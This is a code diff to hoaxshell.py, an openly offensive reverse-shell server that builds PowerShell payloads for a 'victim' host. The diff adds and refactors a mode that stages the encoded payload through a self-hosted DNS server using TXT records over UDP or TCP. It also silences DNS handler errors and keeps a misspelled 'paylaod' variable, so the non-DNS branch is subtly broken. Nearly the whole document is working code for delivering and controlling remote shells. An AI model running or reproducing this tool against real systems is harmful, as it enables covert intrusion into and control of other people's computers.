@@ -16,7 +16,6 @@ from subprocess import check_output, Popen, PIPE
 from string import ascii_uppercase, ascii_lowercase
 from platform import system as get_system_type
 from random import randint
-import traceback
 import socketserver
 import struct
 from textwrap import wrap
@@ -88,6 +87,18 @@ Usage examples:
 
      sudo python3 hoaxshell.py -ng
 
+  - Use a self hosted DNS server to send the payload using domain TXT records:
+
+     # Make sure you're allowed to use port 53 and forwarding is enabled to use this feature.
+
+	 # For UDP based DNS servers:
+	 sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -udp 
+	
+	 # For TCP based DNS servers:
+	 sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -tcp
+	
+	 # For both UDP and TCP based DNS servers:
+	 sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -tcp -udp
 
 '''
 )
@@ -108,10 +119,10 @@ parser.add_argument("-t", "--trusted-domain", action="store_true", help = "If yo
 parser.add_argument("-cm", "--constraint-mode", action="store_true", help="Generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell's stdout decoding accuracy.")
 parser.add_argument("-lt", "--localtunnel", action="store_true", help="Generate Payload with localtunnel")
 parser.add_argument("-ng", "--ngrok", action="store_true",help="Generate Payload with Ngrok")
-parser.add_argument("-dns", "--dns-server", action="store_true", help="Transmit payload over DNS")
+parser.add_argument("-dns", "--dns-server", action="store_true", help="Transmit payload over DNS server.")
 parser.add_argument("-d", "--domain", action="store", help="Fake domain name for DNS server - only used with -dns")
-parser.add_argument("--tcp", action="store_true", help="Start dns server in tcp mode - only used with -dns")
-parser.add_argument("--udp", action="store_true", help="Start dns server in udp mode - only used with -dns")
+parser.add_argument("-tcp","--tcp", action="store_true", help="Start dns server in tcp mode - only used with -dns")
+parser.add_argument("-udp","--udp", action="store_true", help="Start dns server in udp mode - only used with -dns")
 parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
 
@@ -196,6 +207,33 @@ def encodePayload(payload):
 	return enc_payload
 
 
+def generateDNSPayload(enc_payload):
+	'''Encoded Paylaod'''
+	DNSserver.prepare(enc_payload)
+	range = DNSserver.get_range()  # Payload chunk counts for subdomain generation
+	#starting DNS server
+	try:
+		DNSserver.start()
+	except OSError:
+		exit(f'\n[{FAILED}] - {BOLD}Port 53 seems to already be in use.{END}\n')
+
+	#Payload if both TCP and UDP servers are running
+	if not (args.tcp and args.udp):
+		DnsPayload = open(f'{cwd}/payload_templates/https_payload_dns_udp.ps1', 'r') if not args.tcp else open(
+							f'{cwd}/payload_templates/https_payload_dns_tcp.ps1', 'r')
+
+		payload = DnsPayload.read().strip()
+		DnsPayload.close()
+	else:
+		TcpPayload = open(f'{cwd}/payload_templates/https_payload_dns_tcp.ps1', 'r').read().strip()
+		UdpPayload = open(f'{cwd}/payload_templates/https_payload_dns_udp.ps1', 'r').read().strip()
+
+		payload = f'{END}[{INFO}] Payload for {MAIN}TCP{END} baesd DNS Lookup\n{PLOAD}{TcpPayload}{END}\n{END}[{INFO}] Payload for {MAIN}UDP{END} baesd DNS Lookup\n{PLOAD}{UdpPayload}{END}'
+
+	payload = payload.replace('*SERVERIP*', args.server_ip).replace(
+		'*DOMAIN*', args.domain).replace('*RANGE*', str(range))
+	
+	return payload
 
 def is_valid_uuid(value):
 
@@ -401,7 +439,7 @@ class BaseRequestHandler(socketserver.BaseRequestHandler):
 			data = self.get_data()
 			self.send_data(self.dns_response(data))
 		except Exception:
-			traceback.print_exc(file=sys.stderr)
+			pass
 
 	def dns_response(self, data):
 		request = DNSRecord.parse(data)
@@ -478,8 +516,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	
 	
 	def cmd_output_interpreter(self, output, constraint_mode = False):
-		
-		global prompt
+	
 		
 		try:
 			
@@ -605,7 +642,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 	def do_POST(self):
 		
-		global prompt
 		timestamp = int(datetime.now().timestamp())
 		Hoaxshell.last_received = timestamp
 		self.server_version = Hoaxshell.server_version
@@ -695,6 +731,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 def main():
 
+	global prompt, cwd, DNSserver, t_process
 	try:
 		chill() if quiet else print_banner()
 		cwd = path.dirname(path.abspath(__file__))
@@ -737,6 +774,15 @@ def main():
 		elif not args.server_ip and not args.update and not (args.localtunnel or args.ngrok):
 			exit_with_msg('Local host ip or Tunnel not provided (use -s for IP / -lt or -ng for Tunneling)')
 
+		elif any([args.dns_server, args.domain, args.tcp, args.udp]) and (args.localtunnel or args.ngrok):
+			exit_with_msg('DNS server\'s paramenters can only be used with Local server (-s) not with localtunnel (-lt) or ngrok (-ng)')
+
+		elif args.dns_server and not any([args.domain, args.tcp, args.udp]):
+			exit_with_msg('DNS server must be used with Domain (-d) and protocol(s) -tcp and/or -udp')
+		
+		elif any([args.domain, args.tcp, args.udp]) and not args.dns_server:
+			exit_with_msg('DNS server not provided (use -dns for DNS server)')
+
 		else:
 			if not args.trusted_domain and not (args.localtunnel or args.ngrok):
 				# Check if provided ip is valid
@@ -754,8 +800,7 @@ def main():
 			for char in args.Header:
 				if char not in valid:
 					 exit_with_msg('Header name includes illegal characters.')
-					 
-		global DNSserver
+		# DNS server		 
 		if args.dns_server and not (args.localtunnel or args.ngrok):
 			if not args.domain or not (args.tcp or args.udp):
 				exit_with_msg('DNS server requires a domain name (-d, --domain) and a valid protocol (--tcp or --udp).')
@@ -773,7 +818,6 @@ def main():
 		server_ip = f'{args.server_ip}:{server_port}'
 		
 		# Tunneling
-		global t_process
 		tunneling = False
 		
 		if args.localtunnel or args.ngrok:
@@ -862,25 +906,13 @@ def main():
 
 			if args.raw_payload:
 				print(f'{PLOAD}{payload}{END}')
-			elif not args.dns_server:
-				paylaod = "powershell -e "+enc_payload
-				print(f'{PLOAD}{payload}{END}')
-			else:
-				DNSserver.prepare(enc_payload)
-				range = DNSserver.get_range() #Payload chunk counts for subdomain generation
-				DNSserver.start() #starting DNS server
-				if not (args.tcp and args.udp):
-					DnsPayload = open(f'{cwd}/payload_templates/https_payload_dns_udp.ps1', 'r') if not args.tcp else open(
-							f'{cwd}/payload_templates/https_payload_dns_tcp.ps1', 'r')
-					payload = DnsPayload.read().strip()
-					DnsPayload.close()
-				else:
-					TcpPayload = open(f'{cwd}/payload_templates/https_payload_dns_tcp.ps1', 'r').read().strip()
-					UdpPayload = open(f'{cwd}/payload_templates/https_payload_dns_udp.ps1', 'r').read().strip()
-					payload = f'{END}[{INFO}] Payload for {MAIN}TCP{END} baesd DNS Lookup\n{PLOAD}{TcpPayload}{END}\n{END}[{INFO}] Payload for {MAIN}UDP{END} baesd DNS Lookup\n{PLOAD}{UdpPayload}{END}'
 
-				payload = payload.replace('*SERVERIP*', args.server_ip).replace(
-					'*DOMAIN*', args.domain).replace('*RANGE*', str(range))
+			elif args.dns_server:
+				payload = generateDNSPayload(enc_payload)
+				print(f'{PLOAD}{payload}{END}')
+
+			else:
+				paylaod = "powershell -e "+enc_payload
 				print(f'{PLOAD}{payload}{END}')
 
 
